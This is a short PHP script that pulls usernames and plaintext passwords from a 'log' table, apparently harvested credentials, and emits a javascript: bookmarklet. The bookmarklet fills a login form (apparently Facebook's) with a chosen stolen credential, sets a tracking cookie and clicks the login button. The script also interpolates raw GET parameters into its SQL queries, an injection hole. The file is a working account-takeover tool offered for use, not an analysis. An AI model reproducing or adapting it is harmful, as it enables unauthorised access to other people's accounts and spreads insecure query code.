<?php
include 'common.php';

if(isset($_GET['start'])){
	$start=$_GET['start'];
}else{
		$start=0;
	}
	
if(isset($_GET['end'])){
	$end=$_GET['end'];
}else{
		$end=100;
	}
echo "<textarea cols=50 rows=10>";
echo "javascript:start={$start};user=Array(";
$retval=sql_query("select * from log where id > $start && id < $end");
while($row=mysql_fetch_array($retval)){
	$username=$row['username'];
	$pass=$row['pass'];
	echo "'{$username}',";
}
echo "0);";
echo "pass=Array(";
$retval=sql_query("select * from log where id > $start && id < $end ");
while($row=mysql_fetch_array($retval)){
	$username=$row['username'];
	$pass=$row['pass'];
	echo "'{$pass}',";
}
echo "0);";
echo "userid=Array(";
$retval=sql_query("select * from log where id > $start && id < $end ");
while($row=mysql_fetch_array($retval)){
	$username=$row['username'];
	$pass=$row['pass'];
	$id=$row['id'];
	echo "'{$id}',";
}
echo "0);now=prompt();now-=(start+1);document.cookie='nowfbloged='+userid[now];{ document.forms[0].email.value = user[now]; document.forms[0].pass.value = pass[now];}document.getElementsByName('login')[0].click();";
?>
</textarea>